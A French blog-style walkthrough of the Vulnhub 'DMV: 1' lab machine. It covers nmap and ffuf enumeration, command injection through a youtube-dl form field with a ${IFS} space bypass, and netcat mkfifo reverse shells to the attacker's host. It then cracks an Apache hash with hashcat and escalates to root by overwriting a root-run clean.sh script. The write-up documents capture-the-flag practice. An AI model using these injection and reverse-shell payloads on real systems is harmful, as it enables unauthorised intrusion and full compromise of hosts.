---
layout: default
title: "Writeup DMV: 1 - Vulnhub"
date:   2020-08-06 10:00:00 +0200
published: true
---

# Information sur la box :

* **Difficulté** : Facile
* **Description** : *It is a simple machine that replicates a real scenario that I found. The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root user*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/dmv-1,462/](https://www.vulnhub.com/entry/dmv-1,462/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Shell basique via command injection](#shell-basique)
*	[Privilege escalation jusqu'au root](#privilege-escalation)

* * *

## Énumération
* * *

Comme à chaque début de box il faut trouver son adresse IP avec ``nmap`` en utilisant l'option ``-sP`` (**Ping Scan**) :

```bash
nmap -sP 192.168.1.0/24
```

On obtient l'IP : **192.168.1.47**

On va donc énumérer les services et ports ouverts sur la machine à attaquer :

```bash
nmap -sV -p- 192.168.1.47 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

Voici les informations que l'on obtient :

```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (EdDSA)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
7585/tcp  filtered unknown
7591/tcp  filtered unknown
7884/tcp  filtered unknown
14206/tcp filtered unknown
17968/tcp filtered unknown
18673/tcp filtered unknown
20718/tcp filtered unknown
24831/tcp filtered unknown
31128/tcp filtered unknown
38128/tcp filtered unknown
40825/tcp filtered unknown
42720/tcp filtered unknown
43939/tcp filtered unknown
45137/tcp filtered unknown
49693/tcp filtered unknown
51150/tcp filtered unknown
51344/tcp filtered unknown
54605/tcp filtered unknown
57442/tcp filtered unknown
64067/tcp filtered unknown
``` 
On peut croire qu'il y a beaucoup d'informations sauf qu'il n'y a que **2** ports **ouverts** et que tous les autres sont fermés / filtrés

On peut commencer par tenter de se connecter au **SSH** pour voir si jamais une **bannière** est présente. Cela pourrait nous donner des **informations intéressantes** :

```bash
ssh root@192.168.1.47
```

Mais aucune information n'est présente.

Un site web tourne sur la machine sur le port **80**. 

On va se rendre dessus via le navigateur mais avant on lance un fuzzing de directory pour voir si on trouve des choses utiles :

```bash
ffuf -u http://192.168.1.47/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .php,.txt,.html
```

On recherche également de potentiels fichiers qui auraient pour **extension .php, .txt et .html**.

```bash
images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 747, Words: 154, Lines: 20]
admin                   [Status: 401, Size: 459, Words: 42, Lines: 15]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
tmp                     [Status: 301, Size: 310, Words: 20, Lines: 10]
```

La plupart des répertoires sont inacessibles.                                                                                                                                          
**/admin** semble intéressant mais on ne connait pas les identifiants pour le moment.

On peut quand même tenter un bruteforce :

```bash
hydra -l admin -P /usr/share/wordlist/rockyou.txt 192.168.1.47 http-get /admin
```

Comme supposé, **aucun** résultat concluant.                                                                                                                                  

Concernant le site web il s'agit d'un site permettant de **télécharger des vidéos Youtube** en indiquant l'**ID** de la vidéo en question. Il suffit ensuite de cliquer sur le bouton.

En ouvrant la **Console** du navigateur et en se rendant dans l'onglet **Réseau** on peut apercevoir un **script** (*main.js*) qui paraît intéressant :

```js
$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

On voit ici que le script va **envoyer des données** au site en récupérant l'ID passé précédemment dans le champ texte. En fonction du **résultat** un message différent sera affiché.              
Cependant on n'en sait pas plus. Il nous suffit de dégainer notre couteau suisse du web, j'ai nommé **BurpSuite** !                                                             

Après avoir setup le proxy pour faire fonctionner BurpSuite on peut intercepter notre première requête. On va commencer par entrer un ID légitime -> 668nUCeBHyY                                    
L'ID à entrer est la partie de l'URL d'une vidéo Youtube qui se situe après le ``?v=``.

Voici ce que l'on intercpte via le proxy BurpSuite. Il nous suffit de l'envoyer au **Repeater** puis d'envoyer.

```bash
POST / HTTP/1.1
Host: 192.168.1.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.47
Connection: close
Referer: http://192.168.1.47/

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D668nUCeBHyY
```

La réponse que l'on obtient est la suivante : 

```bash
HTTP/1.1 200 OK
Date: Thu, 06 Aug 2020 21:22:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1240
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":0,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\n","url_orginal":"
https:\/\/www.youtube.com\/watch?v=668nUCeBHyY","output":"[youtube] 668nUCeBHyY: Downloading webpage\n[download] Destination: \/var\/www\/html\/tmp\/downloads\/5f2c74b30a24d.mp4\n\r[download]   0.1% of 
1.62MiB at 35.77KiB\/s ETA 00:46\r[download]   0.2% of 1.62MiB at 106.13KiB\/s ETA 00:15\r[download]   0.4% of 1.62MiB at 246.25KiB\/s ETA 00:06\r[download]   0.9% of 1.62MiB at 525.06KiB\/s ETA 00:03\r
[download]   1.9% of 1.62MiB at 341.18KiB\/s ETA 00:04\r[download]   3.8% of 1.62MiB at 394.74KiB\/s ETA 00:04\r[download]   7.6% of 1.62MiB at 300.24KiB\/s ETA 00:05\r[download]  15.3% of 1.62MiB at 
593.03KiB\/s ETA 00:02\r[download]  30.7% of 1.62MiB at 580.40KiB\/s ETA 00:01\r[download]  61.5% of 1.62MiB at 647.18KiB\/s ETA 00:00\r[download] 100.0% of 1.62MiB at 652.38KiB\/s ETA 00:00\r[
download] 100% of 1.62MiB in 00:02\n[ffmpeg] Destination: \/var\/www\/html\/tmp\/downloads\/5f2c74b30a24d.mp3\nDeleting original file \/var\/www\/html\/tmp\/downloads\/5f2c74b30a24d.mp4 (pass -k to 
keep)\n","result_url":"\/tmp\/downloads\/5f2c74b30a24d.mp3"}
```

Malgré le message de warning, on sait désormais que le site en background utilise l'outil **youtube_dl** pour télécharger les fichiers.                                                   
On peut d'ailleur essayer en allant sur l'URL fournie à la fin du téléchargement : **http://192.168.1.47/tmp/downloads/5f2c74b30a24d.mp3**

On remarquera aussi le numéro de **retour de la commande** égal à **0** qui avait dans le code **Javascript** et dessus et qui correspond à une bonne exécution.

Ça c'était pour l'utilisation **"normale"** du site.

Mais comme nous cherchons des vulnérabilités, on va tenter autre chose.                                                                                                                          
Que se passe-t-il si on tenter de rentrer n'importe quoi dans le champ texte ? Peut-on exécuter des commandes ? Si oui alors il y a une vulnérabilité et donc on pourra potentiellement obtenir un shell par ce moyen.

En envoyant **test** comme ID, on obtient un message d'erreur (qui vaut 1) et qui nous dit que l'ID n'est pas complet.

```bash
POST / HTTP/1.1
Host: 192.168.1.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.47
Connection: close
Referer: http://192.168.1.47/

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dtest
```


```bash
HTTP/1.1 200 OK
Date: Thu, 06 Aug 2020 21:33:22 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 386
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 
test. URL https:\/\/www.youtube.com\/watch?v=test looks truncated.\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=test","output":"","result_url":"\/tmp\/downloads\/5f2c7722bcf1a.mp3"}
```

On imagine que l'outil **youtube_dl** est utilisé directement sur la machine cible pour télécharger les fichiers demandés.                                                                          
Tentons d'exécuter une commande basique : **id**. Comme l'outil est utilisé en ligne de commandes (enfin on le suppose) alors on va entourer notre commande par ``;`` pour terminer la commande précédente, exécuter la notre et potentiellement empêcher ce qui suit d'interférer avec notre résultat : 

```bash
POST / HTTP/1.1
Host: 192.168.1.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.47
Connection: close
Referer: http://192.168.1.47/

yt_url=;id;
```
Et on obtient : 

```bash
HTTP/1.1 200 OK
Date: Thu, 06 Aug 2020 21:39:24 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 486
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL
 [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";id;","output":"uid=33(www-data) 
 gid=33(www-data) groups=33(www-data)\n","result_url":"\/tmp\/downloads\/5f2c788cef8f8.mp3"}
```

On aperçoit bien dans le champ **output** le résultat de notre commande.                                                                                                                            
En théorie on peut donc exécuter n'importe quelle commande et donc obtenir un shell sur la machine.

Sauf que ce n'est pas si simple parce que dans l'URL on ne peut pas spécifier **d'espace**. Par exemple avec ``ping 127.0.0.1`` uniquement ce qui se **trouve avant** l'espace sera pris en compte.    
Cela pose problème pour exécuter un reverse shell.                                                                                                             
Après quelques recherches avec les mots clés **bypass without spaces** je me suis retrouvé sur le Github de nos chers amis [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space).

J'ai alors essayé plusieurs techniques et celle utilisant ``${IFS}`` fonctionnait.

``${IFS}`` est donc un séparateur de champs utilisé dans les shells qui par défaut est égal à ``${IFS}=' \t\n'``, soit espace, tabulation, nouvelle ligne. On peut l'utiliser par défaut dans notre cas sans modifier sa valeur.

Il nous suffit de remplacer tous les espaces de notre reverse shell par ``${IFS}``. Essayons ça avec un simple **ping** vers notre machine !

On doit juste au préalable, de notre côté, lancer une capture pour intercepter le ping et voir si la commande fonctionne bien :

```bash
tcpdump -i enp0s8 icmp
```

Ensuite on lance la requête :

```bash
POST / HTTP/1.1
Host: 192.168.1.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.47
Connection: close
Referer: http://192.168.1.47/

yt_url=;`ping${IFS}192.168.1.16`
```

Et sur notre machine on reçoit bien le ping !

```bash
23:54:23.425989 IP dmv.home > krowz.home: ICMP echo request, id 1938, seq 2, length 64
23:54:23.426021 IP krowz.home > dmv.home: ICMP echo reply, id 1938, seq 2, length 64
23:54:24.449820 IP dmv.home > krowz.home: ICMP echo request, id 1938, seq 3, length 64
23:54:24.449919 IP krowz.home > dmv.home: ICMP echo reply, id 1938, seq 3, length 64
```

Il ne nous reste plus qu'à y mettre notre reverse shell. 

* * *

## Shell basique

Pour ce faire j'ai utilisé **nc**.

Il faut bien évidemment lancer le listener sur notre machine attaquante 
```bash
nc -lnvp 4444
```

```bash
POST / HTTP/1.1
Host: 192.168.1.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.47
Connection: close
Referer: http://192.168.1.47/

yt_url=;`rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i|nc${IFS}192.168.1.16${IFS}4444${IFS}>/tmp/f`
```

Et nous voilà avec un shell sur la machine. Comme d'habitude, on sera plus à l'aise avec un shell propre :

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

On ne va pas aller trop loin et rechercher dans le dossier **admin** si on trouve quelque chose d'important.                                                                                     
Et effectivement nous sommes servis !

```bash
cd admin 
cat flag.txt

flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

Le premier flag est présent. 

## Privilege Escalation

Dans le même répertoire on trouve aussi un fichier .htpasswd intrigant : 

```bash
cat /var/www/html/admin/.htpasswd

itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

Ça nous sera sûrement utile par la suite. Avec un petite recherche Google sur **$apr1** on se rend compte qu'il s'agit de MD5 utilisé par Apache avec plusieurs itérations. Le lien [ici](https://httpd.apache.org/docs/2.4/fr/misc/password_encryptions.html).

Heureusement j'ai toujours **hashcat** sous la main et ça tombe bien puisqu'il possède un mode pour cracker les hashs MD5 utilisés par Apache :

```bash
hashcat -h | grep Apache

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server
```

Il s'agit du **mode 1600**. On a juste à **ajouter le hash** à un fichier qu'on va appeler ``hash.txt``.                                                                                     
On utilise maintenant la commande avec la wordlist **rockyou** :

```bash
hashcat -m 1600 --force hash.txt /usr/share/wordlist/rockyou.txt
```
Après quelques instants on trouve le mot de passe : **jessie**.

Nous avons donc la combinaison suivante : ``itsmeadmin:jessie``.                                                                                                                                       
Sur la machine il n'y a pas de compte nommé **itsmeadmin** donc on ne peut que l'utiliser sur le site web à l'adresse : http://192.168.1.47/admin

Effectivement on se retrouve connectés. Sur cette page on retrouve un bouton **Clean Downloads** qui exécute une commande via l'URL : 

```bash
rm -rf /var/www/html/tmp/downloads
```

Ok, donc on doit pouvoir nous aussi exécuter des commandes via cette URL. Essayons :

```bash
http://192.168.1.47/admin/?c=id
```

Le résultat n'est pas aussi flamboyant qu'on l'aurait espéré :

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Effectement, on peut **exécuter** des commandes avec les droits de l'utilisateur ``www-data`` mais pour le moment peu d'utilités puisque nous avons déjà un shell avec cet utilisateur.
Il s'agit donc soit d'une fausse piste, soit il y a une autre façon d'exploiter ceci.

De retour côté shell je tente de lancer un petit **[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)** pour voir les potentielles données intéressantes (SUID, cronjobs, passwords, configs ...). Mais rien de très probant.

J'ai appris il n'y a pas si longtemps que même s'il n'y avait rien dans les cron jobs il fallait quand même vérifier les services qui tournaient périodiquement sur la machine. Et effectivement ça m'a servi puisque qu'en utilisant **[pspy64](https://github.com/DominicBreuker/pspy)** on se rend compte que **root** lance toutes les minutes la commande suivante :

```bash
2020/08/06 18:57:01 CMD: UID=0    PID=2121   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh
```

Hm ... Le **clean** ne nous rappelle pas quelque chose ? Et oui ! L'interface web sur laquelle on peut exécuter des commandes. Il ne nous reste plus qu'à voir si nous disposons des droits suffisants pour modifier le fichier et y intégrer le code voulu :

```bash
ls -la /var/www/html/tmp/clean.sh

-rw-r--r-- 1 www-data www-data 84 Aug  6 19:07 /var/www/html/tmp/clean.sh
```

Bingo ! Il nous suffit de le modifier pour ajouter notre reverse shell qui sera exécuter par ``root`` :

```bash
echo 'rm /tmp/p; mkfifo /tmp/p; cat /tmp/p|/bin/sh -i 2>&1 | nc 192.168.1.16 5555 >/tmp/p' > clean.sh
```

On fait bien attention de ne pas utiliser le même **port** ni le même **fichier** dans /tmp pour éviter de casser notre connexion actuelle.

Après quelques secondes on obtient notre shell en tant que **root**.

Il nous suffit de récupérer le flag :

```bash
cat root.txt

flag{d9b368018e912b541a4eb68399c5e94a}
```

Cette box n'était pas très compliquée même si elle m'a fait chercher pendant quelques temps comment **bypass les espaces** dans l'URL ainsi que le service qui tournait en fond mais qui n'était pas dans les **cron jobs**.

Merci à ([@over_jt](https://twitter.com/over_jt)) pour cette box !

Les prochaines fois faîtes bien **attention** ! Si vous ne voyez pas de cron jobs actifs cela ne veut pas dire qu'il n'y a rien qui tourne **périodiquement** sur la machine !